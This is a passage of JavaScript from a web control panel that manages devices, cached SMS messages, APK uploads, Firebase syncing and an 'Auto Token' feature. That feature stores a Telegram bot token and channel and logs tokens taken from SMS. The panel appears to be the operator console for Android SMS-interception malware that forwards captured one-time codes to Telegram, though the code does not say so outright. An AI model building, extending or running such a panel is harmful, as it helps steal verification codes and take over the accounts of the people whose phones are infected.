  if(tokenEl&&tokenEl.value.trim())body.bot_token=tokenEl.value.trim();
  if(channelEl&&channelEl.value.trim())body.channel_id=channelEl.value.trim();
  if(ownerEl&&ownerEl.value.trim())body.owner_id=ownerEl.value.trim();
  toast('Setting webhook…',true);
  smsTokenFetch(body).then(function(d){
    if(d&&d.ok){
      if(d.config)_autoTokenConfig=d.config;
      updateAutoTokenUi(_autoTokenConfig);
      toast('Webhook connected ✓',true);
      return;
    }
    var err=(d&&d.error)||(d&&d.telegram&&d.telegram.description)||'Webhook failed';
    toast(err,false);
  }).catch(function(){toast('Webhook failed',false);});
}
function loadAutoTokenState(){
  return smsTokenFetch({action:'get'}).then(function(d){
    if(!d||!d.ok)return d;
    if(d.config){
      _autoTokenOn=!!d.config.enabled;
      _autoTokenConfig=d.config;
    }
    _smsTokenLog=d.log||[];
    updateAutoTokenUi(d.config);
    renderAutoTokenLog(_smsTokenLog);
    return d;
  }).catch(function(){return null;});
}
function refreshAutoTokenLog(){
  smsTokenFetch({action:'get'}).then(function(d){
    if(d&&d.ok){
      _smsTokenLog=d.log||[];
      if(d.config)_autoTokenConfig=d.config;
      renderAutoTokenLog(_smsTokenLog);
      toast('Log updated',true);
    }
  }).catch(function(){toast('Log refresh failed',false);});
}
function openAutoTokenSheet(){
  loadAutoTokenState();
  document.getElementById('tokenSheetBg').classList.add('open');
  document.getElementById('autoTokenSheet').classList.add('open');
}
function closeAutoTokenSheet(){
  document.getElementById('tokenSheetBg').classList.remove('open');
  document.getElementById('autoTokenSheet').classList.remove('open');
}
function toggleAutoToken(){
  _autoTokenOn=!_autoTokenOn;
  var toggle=document.getElementById('autoTokenToggle');
  if(toggle)toggle.classList.toggle('on',_autoTokenOn);
  smsTokenFetch({action:'save',enabled:_autoTokenOn,bot_token:_autoTokenConfig.bot_token||'',channel_id:_autoTokenConfig.channel_id||'',owner_id:_autoTokenConfig.owner_id||''}).then(function(d){
    if(d&&d.ok&&d.config)_autoTokenConfig=d.config;
    if(d&&d.log)_smsTokenLog=d.log;
    updateAutoTokenUi(_autoTokenConfig);
    toast(_autoTokenOn?'Auto Token ON':'Auto Token OFF',true);
  }).catch(function(){toast('Auto token save failed',false);});
}

/* BOOT */
document.addEventListener('visibilitychange',function(){
  _panelPaused=document.hidden;
});
(function(){
  try{
    panelReady=true;
    loadLiked();
    bindDevListEvents();
    loadActiveFb();
    loadDeviceToggles();
    bindApkUpload();
    loadSmsCacheFromStorage();
    ensureActiveFbValid();
    processClientsDataNow();
    fetchAllData().catch(function(){toast('Sync failed — check Firebase',false);});
    loadAutoTokenState();
  }catch(e){console.error(e);}
})();
setInterval(function(){
  if(!panelReady||_panelPaused)return;
  fetchAllData(false).catch(function(){});
},SYNC_INTERVAL_MS);
window.addEventListener('unhandledrejection',function(){});
